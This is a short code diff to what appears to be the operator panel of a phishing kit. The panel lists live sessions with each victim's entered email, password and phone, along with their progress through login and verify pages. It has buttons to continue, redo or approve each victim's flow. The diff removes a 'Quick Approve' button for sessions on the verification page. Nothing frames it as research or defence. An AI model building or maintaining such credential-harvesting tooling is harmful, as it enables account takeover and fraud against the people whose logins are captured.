@@ -777,12 +777,6 @@
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
-      
-      // Quick approve button for verify.html with phone entered
-      if (s.page === 'verify.html' && s.phone && s.entered) {
-        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check-square-svgrepo-com.svg"></button>`;
-      }
-      
       if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
@@ -1109,3 +1103,4 @@
   </script>
 </body>
 </html>
+
